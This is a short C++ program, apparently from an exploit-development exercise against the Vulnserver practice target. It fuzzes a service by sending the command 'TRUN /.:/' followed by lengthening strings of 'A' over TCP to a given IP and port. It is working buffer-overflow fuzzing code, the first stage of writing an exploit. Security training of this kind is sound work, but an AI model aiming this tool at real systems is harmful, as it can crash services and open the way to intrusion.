#include <bits/stdc++.h>
#include "./../helper.cpp"
#include <boost/asio.hpp>

using namespace std;
using namespace VAT;
using namespace boost;

#define errormayhappen                                 \
    if (ec.value() != 0)                               \
    {                                                  \
        string msg = "Error : " + ec.message() + "\n"; \
        return ec.value();                             \
    }

int main(int argc, char *argv[])
{
    if (argc != 3)
    {
        cerr << (string) "Usage : " + argv[0] + " <ip> <port>";
        return 0;
    }

    int counter = 100;
    string payload = "";
    for (int i = 0; i < 35; i++)
    {
        payload = createstr('A', counter);
        payload = "TRUN /.:/" + payload;
        cout << (string) "Fuzzing with " + to_string(counter) + " bytes\n";

        //***************
        asio::io_service ioservice;
        system::error_code ec;
        asio::ip::address ip = asio::ip::address::from_string(argv[1], ec);
        int port = atoi(argv[2]);
        asio::ip::tcp::endpoint ep(ip, port);
        errormayhappen;

        asio::ip::tcp::socket client(ioservice);
        asio::ip::tcp protocol = asio::ip::tcp::v4();
        client.open(protocol, ec);
        errormayhappen;
        client.connect(ep, ec);
        errormayhappen;

        client.write_some(asio::buffer(payload.data(),payload.size()), ec);
        errormayhappen;

        client.close(ec);
        errormayhappen;
        //###############

        counter += 200;
    }
    return 0;
}